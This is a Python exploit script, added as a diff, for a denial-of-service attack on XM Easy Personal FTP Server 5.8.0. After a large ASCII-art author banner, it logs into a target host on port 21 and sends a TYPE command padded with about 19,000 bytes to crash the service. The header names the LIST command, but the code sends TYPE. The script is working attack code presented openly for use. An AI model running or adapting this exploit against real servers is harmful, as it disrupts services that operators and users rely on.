@@ -1,0 +1,77 @@
+#!/usr/bin/python
+#
+# Exploit Title : XM Easy Personal FTP Server 5.8.0 Denial Of Service LIST command
+# Date: 10/02/2011
+# Author: Houssam Sahli
+# Software Link: http://www.dxm2008.com/data/ftpserversetup.exe
+# Version: 5.8.0
+# Tested on: Windows XP SP3 French
+
+#!/usr/bin/python
+print "\n2ctUtjjJUJUJUJUJjJUJtJtJUUtjfUtt2UftftfUftft1t1tFfF21fhf11Ft"
+print "ULcYLYLYLcLc7LLcLccJcJYJYJYjJtJjJtjtJtJtUtjUJjJUJtJUJtjtUtUj"
+print "tLUJjJJcJcJcJcJYjhPX0Pb99pb9EbMEDEDEMDZbZDD0XfFf1f2tFf22F21U"
+print "JYJJcJcJcJcJcJcJ2                           1hf1f1f1212h2h1f"
+print "ULJcJcJLYLL7L7L71      Houssam Sahli        1h1f2f2fFt1fF1Ft"
+print "ULJcJcJLYLL7L7L71   backtronux@gmail.com    1h1f2f2fFt1fF1Ft"
+print "JccJcY7Lr7777LrLY                           1ht2t1t1f1t12F12"
+print "J7JLcr7r777777L7cUF1hfU7r:i:i:i:rirrj2MRQMMbhf1t2t1tFf1f1tFU"
+print "Y7cLr777r7rrrrrrrLr:, .LPRQQQQQQQQDX7:.:7SpXfFt1f1t121th2Fft"
+print "J7crc77rriririri: ,:tQQQQQQQQQQQQQQQQQRJ:,i19FFf1t2f2f21hfFU"
+print "Y7r777rrii:i:::  JQQQQQQPFfS0MM02hftXQRZPc, ipXSf1t2t1t1fF2f"
+print "Jr777rrii::::, ,QQQQQQQi..::::i:irRR.,hfL7L:  JpSf1tFt12h1Ft"
+print "cr7c77rri:::  7QQQQQQQ1:Et7jjJ7Lrr7r.  ci::i7. iPS22fFf12F12"
+print "Jr7LLrrir:i  EQQQQQQQQr:QQQQQ9L7Lri.,   i.::rtY :hSf1f121fFU"
+print "c7rL77rrrr. DQQQQQQQQQ:::riri77c77i.    .ri7LfE9 ihh2Ffhfhf2"
+print "j7crc77r7i UQQQjrir:rQQFcii:ii77Lrr.,    f11PpZQZ.JFF1h2F1hf"
+print "JLcLrLLLL..QQQc.irr7i0QQQQQMhUrr7Lrr:., :Q9QQQQQQh:1t2tft1f2"
+print "J7Jcc7LLJ cQQQQL:i777irUMQQQQQQL77L77rr:pJ:7PQQQQQ:Jhf1tFt2J"
+print "JccJcc7c7 2QQQQQE7:r7Lri:r7hDQQQ7LLYLJLc7rrr::XQQQ.jFF1h1h11"
+print "tLjJJcJJJ bQQQQQQQRULr77Lrriii7LcLYLYLYLLLc77:cQQQ7cX2h2h2hf"
+print "jJJUJjJtY 0QQQQQQQQQ0Mt7rrr777777L7LLcLc7c77::ZQQQJJFh2h2FF1"
+print "tLUjjYUjt,tQQQQQQQS  .QQQF7iiirr77L7L7L77ii:LMQQQQ72S1h1h1Sf"
+print "tjjtjjJff:.QQQQQQQQ    ::QQQMpftJc7c77rriLhQQQQQQf:02h1h1F12"
+print "2J2UfUttFJ,Q:     QQb     YQQQQQQQQQQQQQQQQQQQQQQ tXF2F1F2hU"
+print "fjf2Uft2thrr       :L, ,               QQQQQQQQQribF2h2F1h22"
+print "FJ1t2t2t22hrt,  ,     ,,, ,    tPJ7   :QQQQQQQQU:bS2h2hfF2h2"
+print "tUt1t2f1t11SLS.  ,,,,,,,,,,,,, .rt.   QQQ1Sp1p2r9Xfh2h2F2h1F"
+print "1J1t2t1t2t12SYhr    ,,,,,,,,,,,     .QQF.    .tbS2F1F2F1F1hf"
+print "ftf1f1f1t2f12Xt2L.   ,,,,,,,,,,,,, fQf     .fR0Ffh1h1h2h1F21"
+print "hUFt1t1f2t2t1fXhFUL:        , , ,  :     .jRRSF2h2h1h1SFF2Sf"
+print "2f2FfF2Ff12122fhFphhJ7:.             ,:JpRR0212FFh1S1h2hFhF1"
+print "hUF21fFf12Ffh2F2h1XX9X9SXffjUccLcJtfpERZESh1hFhFSFS1hFS1S1Sf\n"
+
+print "\nYou need a valid account to succeed this DoS, but even anonymous can do it as long as it has permission to call TYPE command.\n"
+
+import socket
+import sys
+ 
+def Usage():
+    print ("Usage: ./expl.py <host> <Username> <password>\n")
+buffer= "./A" * 6300
+def start(hostname, username, passwd):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        sock.connect((hostname, 21))
+    except:
+        print ("[-] Connection error!")
+        sys.exit(1)
+    r=sock.recv(1024)
+    print "[+] " + r
+    sock.send("user %s\r\n" %username)
+    r=sock.recv(1024)
+    sock.send("pass %s\r\n" %passwd)
+    r=sock.recv(1024)
+    print "[+] Send malicious string"
+    sock.send("TYPE %s\r\n" %buffer)
+    sock.close()
+ 
+if len(sys.argv) <> 4:
+    Usage()
+    sys.exit(1)
+else:
+    hostname=sys.argv[1]
+    username=sys.argv[2]
+    passwd=sys.argv[3]
+    start(hostname,username,passwd)
+    sys.exit(0)
